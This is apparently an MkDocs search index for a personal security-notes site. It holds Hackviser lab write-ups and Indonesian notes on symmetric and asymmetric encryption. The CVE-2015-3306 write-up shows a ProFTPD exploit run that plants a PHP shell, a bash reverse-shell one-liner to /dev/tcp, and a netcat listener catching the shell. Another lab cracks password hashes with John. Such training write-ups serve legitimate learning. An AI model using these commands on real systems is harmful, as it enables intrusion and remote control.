{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"FAQ nwabellllllllllllllllllllllllllllllllllllllllllllll Is this theme an official shadcn port? No. But you can still star it +heroicons:star+ Why a new mkdocs theme while material exists? First the shadcn/ui theme is just incredible. Actually, nothing can compete with the material theme which is very mature and feature rich. In addition to sticking to the shadcn theme, the idea is to remain a simple theme, providing some special built-in features that we may not find in other themes. Is it open to contributions? Yes, yes and yes! On its own, the theme tries to provide more and more relevant extensions/plugins. But anyone can define what could be relevant! Open an issue and let us discuss about it +heroicons:face-smile+ Is mkdocs-rube-goldberg-plugin-extension supported? In general no. pip pip install mkdocs-shadcn uv uv add mkdocs-shadcn poetry poetry add mkdocs-shadcn Let \\(F\\) be a primitive of \\(f\\) , $$ \\int_{a}^b f(x) ~\\dx = F(b) - F(a). $$ 75% Awesome 25% 5%","title":"Home"},{"location":"#faq","text":"nwabellllllllllllllllllllllllllllllllllllllllllllll Is this theme an official shadcn port? No. But you can still star it +heroicons:star+ Why a new mkdocs theme while material exists? First the shadcn/ui theme is just incredible. Actually, nothing can compete with the material theme which is very mature and feature rich. In addition to sticking to the shadcn theme, the idea is to remain a simple theme, providing some special built-in features that we may not find in other themes. Is it open to contributions? Yes, yes and yes! On its own, the theme tries to provide more and more relevant extensions/plugins. But anyone can define what could be relevant! Open an issue and let us discuss about it +heroicons:face-smile+ Is mkdocs-rube-goldberg-plugin-extension supported? In general no. pip pip install mkdocs-shadcn uv uv add mkdocs-shadcn poetry poetry add mkdocs-shadcn Let \\(F\\) be a primitive of \\(f\\) , $$ \\int_{a}^b f(x) ~\\dx = F(b) - F(a). $$ 75% Awesome 25% 5%","title":"FAQ"},{"location":"Blog/","text":"","title":"Index"},{"location":"Lab/CVE-2015-3306/","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $nmap -sC -sV 172.20.81.12 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-26 00:36 WIB Nmap scan report for 172.20.81.12 (172.20.81.12) Host is up (0.22s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 95:30:f3:df:a0:a0:f5:2c:cb:3a:f7:4a:7d:c4:62:d5 (RSA) | 256 21:d6:55:80:3b:05:0b:b6:f2:f3:0d:07:65:6a:87:41 (ECDSA) |_ 256 6b:5a:cd:21:7f:e0:a5:b2:96:02:18:13:56:db:8c:86 (ED25519) 80/tcp open http Apache httpd 2.4.62 ((Debian)) |_http-server-header: Apache/2.4.62 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds #+END_EXAMPLE BEGIN_EXAMPLE tun0: flags=4305 mtu 1500 inet 10.8.42.37 netmask 255.255.0.0 destination 10.8.42.37 inet6 fe80::3768:6e84:877a:3778 prefixlen 64 scopeid 0x20 unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 2680 bytes 318268 (310.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2820 bytes 156462 (152.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 #+END_EXAMPLE - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 172.20.81.12 - - [26/Aug/2025 00:40:06] \"GET /tes.php HTTP/1.1\" 200 - 172.20.81.12 - - [26/Aug/2025 00:43:53] \"GET /tes.php HTTP/1.1\" 200 - #+END_EXAMPLE - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $python3 modified_cve_2015_3306.py --host 172.20.81.12 --port 21 --path /var/www/html --shell tes.php --lhost 10.8.42.37 --server_port 8000 [+] CVE-2015-3306 exploit by t0kx [+] Exploiting 172.20.81.12:21 [+] Target exploited, acessing shell at http://172.20.81.12/backdoor.php \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $curl -i http://172.20.81.12/tes.php HTTP/1.1 200 OK Date: Mon, 25 Aug 2025 17:44:19 GMT Server: Apache/2.4.62 (Debian) Vary: Accept-Encoding Content-Length: 151 Content-Type: text/html; charset=UTF-8 \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $curl -I http://172.20.81.12/tes.php HTTP/1.1 200 OK Date: Mon, 25 Aug 2025 17:45:08 GMT Server: Apache/2.4.62 (Debian) Content-Type: text/html; charset=UTF-8 #+END_EXAMPLE - #+BEGIN_EXAMPLE bash -c 'bash -i >& /dev/tcp/10.8.42.37/9001 0>&1' #+END_EXAMPLE - ![image.png](../assets/image_1756145279240_0.png) https://www.revshells.com/ - - ![image.png](../assets/image_1756145090577_0.png) - - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $nc -lvnp 9001 Listening on 0.0.0.0 9001 Connection received on 172.20.81.12 55674 bash: cannot set terminal process group (461): Inappropriate ioctl for device bash: no job control in this shell www-data@debian:/var/www/html$ cd / cd / www-data@debian:/$ ls #+END_EXAMPLE - #+BEGIN_EXAMPLE www-data@debian:/$ ls -l /secret.txt ls -l /secret.txt -rwxrwxrwx 1 root root 14 Dec 31 2024 /secret.txt www-data@debian:/$ cat secret.txt cat secret.txt Tyrannosaurus #+END_EXAMPLE - ![image.png](../assets/image_1756145428530_0.png) - https://raw.githubusercontent.com/cdedmondson/Modified-CVE-2015-3306-Exploit/refs/heads/master/cve-2015-3306.png - https://github.com/cdedmondson/Modified-CVE-2015-3306-Exploit?tab=readme-ov-file https://github.com/t0kx/exploit-CVE-2015-3306 https://sploitus.com/?query=cve-2015-3306#exploits","title":"CVE 2015 3306"},{"location":"Lab/CVE-2015-3306/#begin_example","text":"tun0: flags=4305 mtu 1500 inet 10.8.42.37 netmask 255.255.0.0 destination 10.8.42.37 inet6 fe80::3768:6e84:877a:3778 prefixlen 64 scopeid 0x20 unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 2680 bytes 318268 (310.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2820 bytes 156462 (152.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 #+END_EXAMPLE - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 172.20.81.12 - - [26/Aug/2025 00:40:06] \"GET /tes.php HTTP/1.1\" 200 - 172.20.81.12 - - [26/Aug/2025 00:43:53] \"GET /tes.php HTTP/1.1\" 200 - #+END_EXAMPLE - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $python3 modified_cve_2015_3306.py --host 172.20.81.12 --port 21 --path /var/www/html --shell tes.php --lhost 10.8.42.37 --server_port 8000 [+] CVE-2015-3306 exploit by t0kx [+] Exploiting 172.20.81.12:21 [+] Target exploited, acessing shell at http://172.20.81.12/backdoor.php \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $curl -i http://172.20.81.12/tes.php HTTP/1.1 200 OK Date: Mon, 25 Aug 2025 17:44:19 GMT Server: Apache/2.4.62 (Debian) Vary: Accept-Encoding Content-Length: 151 Content-Type: text/html; charset=UTF-8 \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $curl -I http://172.20.81.12/tes.php HTTP/1.1 200 OK Date: Mon, 25 Aug 2025 17:45:08 GMT Server: Apache/2.4.62 (Debian) Content-Type: text/html; charset=UTF-8 #+END_EXAMPLE - #+BEGIN_EXAMPLE bash -c 'bash -i >& /dev/tcp/10.8.42.37/9001 0>&1' #+END_EXAMPLE - ![image.png](../assets/image_1756145279240_0.png) https://www.revshells.com/ - - ![image.png](../assets/image_1756145090577_0.png) - - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/CVE-2015-3306] \u2514\u2500\u2500\u257c $nc -lvnp 9001 Listening on 0.0.0.0 9001 Connection received on 172.20.81.12 55674 bash: cannot set terminal process group (461): Inappropriate ioctl for device bash: no job control in this shell www-data@debian:/var/www/html$ cd / cd / www-data@debian:/$ ls #+END_EXAMPLE - #+BEGIN_EXAMPLE www-data@debian:/$ ls -l /secret.txt ls -l /secret.txt -rwxrwxrwx 1 root root 14 Dec 31 2024 /secret.txt www-data@debian:/$ cat secret.txt cat secret.txt Tyrannosaurus #+END_EXAMPLE - ![image.png](../assets/image_1756145428530_0.png) - https://raw.githubusercontent.com/cdedmondson/Modified-CVE-2015-3306-Exploit/refs/heads/master/cve-2015-3306.png - https://github.com/cdedmondson/Modified-CVE-2015-3306-Exploit?tab=readme-ov-file https://github.com/t0kx/exploit-CVE-2015-3306 https://sploitus.com/?query=cve-2015-3306#exploits","title":"BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/","text":"+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $cat > nums.txt << 'EOF' 83 116 97 114 114 121 78 105 103 104 116 86 97 110 71 111 103 104 EOF \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c \\(awk '{for(i=1;i<=NF;i++) printf \"%c\",\\) i; print \"\"}' nums.txt StarryNightVanGogh #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo -n 'TW9uYUxpc2FEYVZpbmNp' | base64 -d MonaLisaDaVinci #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '%54%68%65%53%63%72%65%61%6D%4D%75%6E%63%68' | sed 's/%//g' | xxd -r -p TheScreamMunch #+END_EXAMPLE id:: 68abb264-12e2-4df8-a49c-3be621898d84 #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '54686542697274684F6656656E7573426F74746963656C6C69' | xxd -r -p TheBirthOfVenusBotticelli #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c \\(echo '01000111 01101001 01110010 01101100 01010111 01101001 01110100 01101000 01000001 01010000 01100101 01100001 01110010 01101100 01000101 01100001 01110010 01110010 01101001 01101110 01100111 01010110 01100101 01110010 01101101 01100101 01100101 01110010' \\ | awk 'function b2d(s, n,i){n=0; for(i=1;i<=length(s);i++) n = n*2 + substr(s,i,1); return n} {for(i=1;i<=NF;i++) printf \"%02x\", b2d(\\) i)} END{print \"\"}' \\ | xxd -r -p GirlWithAPearlEarringVermeer #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo -n 'KRUGKUDFOJZWS43UMVXGGZKPMZGWK3LPOJ4UIYLMNE======' | base32 -d ThePersistenceOfMemoryDali #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '=54=68=65=4E=69=67=68=74=57=61=74=63=68=52=65=6D=62=72=61=6E=64=74' \\ | sed 's/=//g' | xxd -r -p TheNightWatchRembrandt #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo 'FishermenAtSeaTurner' \\ | grep -oE '[0-9]+' | awk '{printf \"%c\", $1} END{print \"\"}' FishermenAtSeaTurner #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $cat > msg.uue <<'EOF' begin 0744 odt_uuencoding_file.dat ,5&AE2VES<TML:6UT ` end EOF \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $uudecode msg.uue \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $ls -la total 12 drwxr-xr-x 1 y0tn y0tn 76 Agu 25 08:00 . drwxr-xr-x 1 y0tn y0tn 26 Agu 25 07:32 .. -rw-r--r-- 1 y0tn y0tn 59 Agu 25 07:59 msg.uue -rw-r--r-- 1 y0tn y0tn 66 Agu 25 07:33 nums.txt -rwxr--r-- 1 y0tn y0tn 12 Agu 25 08:00 odt_uuencoding_file.dat \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $cat odt_uuencoding_file.dat TheKissKlimt #+END_EXAMPLE +BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '8dbdda48fb8748d6746f1965824e966a' > hash.txt \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=16 Press 'q' or Ctrl-C to abort, almost any other key for status simple (?) 1g 0:00:00:00 DONE (2025-08-25 08:05) 100.0g/s 76800p/s 76800c/s 76800C/s jeffrey..james1 Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably Session completed. \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --show --format=raw-md5 hash.txt ?:simple 1 password hash cracked, 0 left #+END_EXAMPLE - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '7610bae85f2b530654cc716772f1fe653373e892' > hash.txt \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x]) Warning: no OpenMP support for this hash type, consider --fork=16 Press 'q' or Ctrl-C to abort, almost any other key for status leonardo (?) 1g 0:00:00:00 DONE (2025-08-25 08:08) 100.0g/s 44000p/s 44000c/s 44000C/s 12345678910..amores Use the \"--show --format=Raw-SHA1\" options to display all of the cracked passwords reliably Session completed. \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --show --format=raw-sha1 hash.txt ?:leonardo 1 password hash cracked, 0 left #+END_EXAMPLE","title":"Cryptanalysis"},{"location":"Lab/Cryptanalysis/#begin_example","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $cat > nums.txt << 'EOF' 83 116 97 114 114 121 78 105 103 104 116 86 97 110 71 111 103 104 EOF \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c \\(awk '{for(i=1;i<=NF;i++) printf \"%c\",\\) i; print \"\"}' nums.txt StarryNightVanGogh #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_1","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo -n 'TW9uYUxpc2FEYVZpbmNp' | base64 -d MonaLisaDaVinci #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_2","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '%54%68%65%53%63%72%65%61%6D%4D%75%6E%63%68' | sed 's/%//g' | xxd -r -p TheScreamMunch #+END_EXAMPLE id:: 68abb264-12e2-4df8-a49c-3be621898d84 #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '54686542697274684F6656656E7573426F74746963656C6C69' | xxd -r -p TheBirthOfVenusBotticelli #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_3","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c \\(echo '01000111 01101001 01110010 01101100 01010111 01101001 01110100 01101000 01000001 01010000 01100101 01100001 01110010 01101100 01000101 01100001 01110010 01110010 01101001 01101110 01100111 01010110 01100101 01110010 01101101 01100101 01100101 01110010' \\ | awk 'function b2d(s, n,i){n=0; for(i=1;i<=length(s);i++) n = n*2 + substr(s,i,1); return n} {for(i=1;i<=NF;i++) printf \"%02x\", b2d(\\) i)} END{print \"\"}' \\ | xxd -r -p GirlWithAPearlEarringVermeer #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_4","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo -n 'KRUGKUDFOJZWS43UMVXGGZKPMZGWK3LPOJ4UIYLMNE======' | base32 -d ThePersistenceOfMemoryDali #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_5","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '=54=68=65=4E=69=67=68=74=57=61=74=63=68=52=65=6D=62=72=61=6E=64=74' \\ | sed 's/=//g' | xxd -r -p TheNightWatchRembrandt #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_6","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo 'FishermenAtSeaTurner' \\ | grep -oE '[0-9]+' | awk '{printf \"%c\", $1} END{print \"\"}' FishermenAtSeaTurner #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_7","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $cat > msg.uue <<'EOF' begin 0744 odt_uuencoding_file.dat ,5&AE2VES<TML:6UT ` end EOF \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $uudecode msg.uue \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $ls -la total 12 drwxr-xr-x 1 y0tn y0tn 76 Agu 25 08:00 . drwxr-xr-x 1 y0tn y0tn 26 Agu 25 07:32 .. -rw-r--r-- 1 y0tn y0tn 59 Agu 25 07:59 msg.uue -rw-r--r-- 1 y0tn y0tn 66 Agu 25 07:33 nums.txt -rwxr--r-- 1 y0tn y0tn 12 Agu 25 08:00 odt_uuencoding_file.dat \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $cat odt_uuencoding_file.dat TheKissKlimt #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Lab/Cryptanalysis/#begin_example_8","text":"\u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '8dbdda48fb8748d6746f1965824e966a' > hash.txt \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=16 Press 'q' or Ctrl-C to abort, almost any other key for status simple (?) 1g 0:00:00:00 DONE (2025-08-25 08:05) 100.0g/s 76800p/s 76800c/s 76800C/s jeffrey..james1 Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably Session completed. \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --show --format=raw-md5 hash.txt ?:simple 1 password hash cracked, 0 left #+END_EXAMPLE - #+BEGIN_EXAMPLE \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $echo '7610bae85f2b530654cc716772f1fe653373e892' > hash.txt \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x]) Warning: no OpenMP support for this hash type, consider --fork=16 Press 'q' or Ctrl-C to abort, almost any other key for status leonardo (?) 1g 0:00:00:00 DONE (2025-08-25 08:08) 100.0g/s 44000p/s 44000c/s 44000C/s 12345678910..amores Use the \"--show --format=Raw-SHA1\" options to display all of the cracked passwords reliably Session completed. \u250c\u2500[y0tn@parrot]\u2500[~/Hackviser/Labs/Cryptanalysis] \u2514\u2500\u2500\u257c $john --show --format=raw-sha1 hash.txt ?:leonardo 1 password hash cracked, 0 left #+END_EXAMPLE","title":"+BEGIN_EXAMPLE"},{"location":"Materi/","text":"Admonition + Code You may face the limits of codehilite however. def fibonacci ( n ): a , b = 0 , 1 for _ in range ( n ): yield a a , b = b , a + b for num in fibonacci ( 10 ): print ( num )","title":"Index"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/","text":"Senin, 25 Agustus 2025 4:45 Enkripsi Simetris ( Symmetric Encryption ) Apasih Enkripsi Semetris? Enkripsi simetris adalah metode enkripsi yang menggunakan satu kunci untuk mengenkripsi dan mendekripsi data. Misal, lu sama temen lu (si A) punya shared box buat ngegibahin si B, lu berdua bisa ngirim dan baca surat di dalem shared box karena punya kunci yang sama, setiap mau ngirim ato ngambil surat make kunci yang sama. Ntu namanya simetris. Intinya, ya, cuma ada dikunci. Kalo si B ngeduplikat ato out of nowhere punya kuncinya, terus ngebaca cit cat ( baca; isi ghibahan ) lu sama si A, yauda abis dah lu bedua WKWK. Macamnya Enkripsi simetris dapat dikategorikan menjadi dua jenis utama: block cipher dan stream cipher . Block Cipher collapsed:: true Memproses data dalam ukuran blok tertentu (misalnya 64-bit atau 128-bit) sekaligus, setiap blok dienkripsi atau didekripsi menggunakan algoritma dan kunci tertentu. DES (Data Encryption Standard) logseq.order-list-type:: number Dikembangkan oleh IBM pada tahun 1970-an, distandardisasi oleh pemerintah AS pada 1977, panjang 56-bit, sudah jarang karena tingkat keamanannya. 3DES (Triple DES) logseq.order-list-type:: number Diciptakan untuk memperbaiki kelemahan DES, enkripsi dengan algoritma DES sebanyak tiga kali (encrypt-decrypt-encrypt), panjang 168-bit. AES (Advanced Encryption Standard) logseq.order-list-type:: number Distandardisasi oleh NIST ( National Institute of Standards and Technology ) pada tahun 2001, paling banyak digunakan karena keamanannya dan kecepatannya. Panjang 128, 192, dan 256-bit. Stream Cipher Memproses data sebagai aliran bit atau byte secara terus-menerus, melakukan operasi enkripsi dan dekripsi pada aliran data tersebut. Data diproses satu per satu, sehingga cocok digunakan untuk komunikasi data yang sifatnya real-time (misalnya streaming). RC4 (Rivest Cipher 4) logseq.order-list-type:: number Dikembangkan oleh Ron Rivest pada tahun 1987, panjang bervariasi, cepat dan sederhana, tapi terdapat kelemahan. Salsa20 dan ChaCha20 logseq.order-list-type:: number Algoritma stream cipher modern yang lebih aman dan cepat, banyak digunakan pada perangkat dengan keterbatasan daya (seperti smartphone dan IoT) karena efisien dalam konsumsi energi. +BEGIN_NOTE Singkatnya, block cipher cocok untuk data dalam ukuran besar dan tetap, sedangkan stream cipher lebih efisien untuk data yang mengalir secara terus-menerus. #+END_NOTE Enkripsi Asimetris ( Asymmetric Encryption ) Apa itu Enkripsi Asimetris Metode enkripsi yang menggunakan dua kunci berbeda\u2014kunci publik dan kunci pribadi\u2014untuk mengenkripsi dan mendekripsi data ibm atau proses penggunaan kunci publik dari pasangan kunci publik/pribadi untuk mengenkripsi teks biasa, lalu menggunakan kunci pribadi yang sesuai untuk mendekripsi ciphertext cloud.google . Solusi ini umumnya dianggap lebih aman, meskipun kurang efisien, daripada enkripsi simetris. #+BEGIN_CENTER https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/461ed9b5-fe53-43a0-a900-e38eda265be4/image-1-833b0f46d.webp #+END_CENTER Public Key Infrastructure (PKI) Skema enkripsi asimetris biasanya diimplementasikan melalui PKI. PKI adalah kerangka kerja untuk membuat, mendistribusikan, dan memvalidasi pasangan kunci publik dan privat. Keamanan kriptografi kunci publik bergantung pada penjagaan kerahasiaan kunci privat sembari membagikan kunci publik secara bebas. Kunci publik hanya dapat mengenkripsi data, sehingga tidak terlalu berharga bagi pelaku ancaman. Selain itu, karena pengguna tidak perlu membagikan kunci pribadi mereka, hal ini sangat mengurangi risiko peretas mencegat kunci yang jauh lebih berharga tersebut. Algoritma Algoritma enkripsi asimetris merupakan tulang punggung dari ekosistem kriptografi modern, menyediakan dasar untuk komunikasi yang aman dan melindungi data sensitif dari akses yang tidak sah. Berikut adalah beberapa algoritma enkripsi asimetris yang umum digunakan: Rivest-Shamir-Adleman (RSA) logseq.order-list-type:: number Dinamai menggunakan nama penemunya. Solusi ini mengandalkan kompleksitas matematika bilangan prima untuk menghasilkan pasangan kunci, meskipun dikembangkan pada tahun 1970-an, RSA tetap banyak digunakan. ECC (Elliptic Curve Cryptography) logseq.order-list-type:: number Berdasarkan sifat matematika kurva elips di atas bidang terbatas, tingkat keamanan setara dengan RSA tetapi dengan panjang kunci yang jauh lebih pendek (contoh: kunci ECC 256-bit \u2248 RSA 2048-bit). DSA (Digital Signature Algorithm) logseq.order-list-type:: number Memungkinkan organisasi dan individu untuk membuat tanda tangan digital yang memastikan keaslian dan integritas pesan atau dokumen. Distandardisasi oleh NIST, DSA mengandalkan masalah matematika dari logaritma diskrit dan muncul dalam berbagai protokol keamanan. +BEGIN_NOTE Sering digunakan pada HTTPS, SSH, TLS, VPN, email, dan tanda tangan digital. #+END_NOTE Kelebihan dan Kekurangan Berikut adalah tabel perbandingan yang merangkum kelebihan dan kekurangan dari enkripsi simetris dan asimetris. Fitur Enkripsi Simetris Enkripsi Asimetris Kelebihan \ud83d\udc4d \ud83d\ude80 Kecepatan Sangat Cepat. Efisien untuk mengenkripsi data dalam jumlah besar. Lambat. Proses komputasinya jauh lebih berat. \ud83d\udcbb Sumber Daya Ringan. Membutuhkan lebih sedikit daya komputasi. Berat. Membutuhkan sumber daya komputasi yang signifikan. \u2728 Kesederhanaan Algoritma dan implementasinya cenderung lebih sederhana. Algoritma lebih kompleks. Kekurangan \ud83d\udc4e \ud83d\ude9a Distribusi Sulit dan Berisiko. Membagikan kunci rahasia secara aman adalah tantangan terbesar. Mudah dan Aman . Kunci publik dapat didistribusikan secara bebas tanpa membahayakan kunci privat. \ud83d\udd11 Manajemen Kompleks, terutama dalam jaringan besar karena setiap pasangan pengguna memerlukan kunci yang berbeda. Lebih Sederhana. Setiap pengguna hanya perlu mengelola satu pasang kuncinya sendiri. \ud83d\udee1\ufe0f Keamanan & Fitur Jika kunci bocor, semua data yang dienkripsi dengan kunci itu terekspos. Sangat Aman. Menyediakan fitur otentikasi dan integritas melalui tanda tangan digital. - - tags:: #Kriptografi #EnkripsiAsimetris #EnkripsiSimetris #Enkripsi","title":"Kriptografi   Enkripsi Simetris dan Asimetris"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#enkripsi-simetris-symmetric-encryption","text":"","title":"Enkripsi Simetris (Symmetric Encryption)"},{"location":"Materi/Kriptografi___Enkripsi%20Simetris%20dan%20Asimetris/#apasih-enkripsi-semetris","text":"Enkripsi simetris adalah metode enkripsi yang menggunakan satu kunci untuk mengenkripsi dan mendekripsi data. Misal, lu sama temen lu (si A) punya shared box buat ngegibahin si B, lu berdua bisa ngirim dan baca surat di dalem shared box karena punya kunci yang sama, setiap mau ngirim ato ngambil 